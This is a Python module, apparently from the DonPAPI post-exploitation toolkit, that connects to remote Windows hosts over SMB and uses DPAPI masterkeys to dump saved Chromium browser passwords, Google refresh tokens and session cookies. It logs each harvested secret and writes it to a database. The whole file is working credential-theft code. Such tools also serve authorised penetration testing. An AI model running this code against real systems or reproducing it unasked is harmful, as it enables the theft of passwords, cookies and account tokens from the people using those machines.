from typing import Any
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.browser import BrowserTriage, LoginData, GoogleRefreshToken
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter


class Chrome:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self):
        self.logger.display("Dumping User Chromium Browsers")
        browser_triage = BrowserTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
        browser_credentials, cookies = browser_triage.triage_browsers(gather_cookies=True)
        for credential in browser_credentials:
            if isinstance(credential,LoginData):
                cred_url = credential.url + " -" if credential.url != "" else "-"
                self.logger.secret(f"[{credential.winuser}] [Password] {cred_url} {credential.username}:{credential.password}", f"{credential.browser.upper()}")
                self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user=credential.winuser, username=credential.username, password=credential.password, target=credential.url, program=credential.browser.title())
            elif isinstance(credential,GoogleRefreshToken):
                self.logger.secret(f"[{credential.winuser}] [Google Refresh Token] {credential.service}:{credential.token}", f"{credential.browser.upper()}")
                self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user=credential.winuser, username=credential.service, password=credential.token, target="Google Refresh Token", program=credential.browser.title())
        for cookie in cookies:
            if cookie.cookie_value != "":
                self.logger.secret(f"[{cookie.winuser}] [Cookie] {cookie.host}{cookie.path} - {cookie.cookie_name}:{cookie.cookie_value}",f"{cookie.browser.upper()}")
                self.context.db.add_cookie(
                    computer=self.context.host,
                    browser=cookie.browser,
                    windows_user=cookie.winuser,
                    url=f"{cookie.host}{cookie.path}",
                    cookie_name=cookie.cookie_name,
                    cookie_value=cookie.cookie_value,
                    creation_utc=cookie.creation_utc,
                    expires_utc=cookie.expires_utc, 
                    last_access_utc=cookie.last_access_utc,
                )
        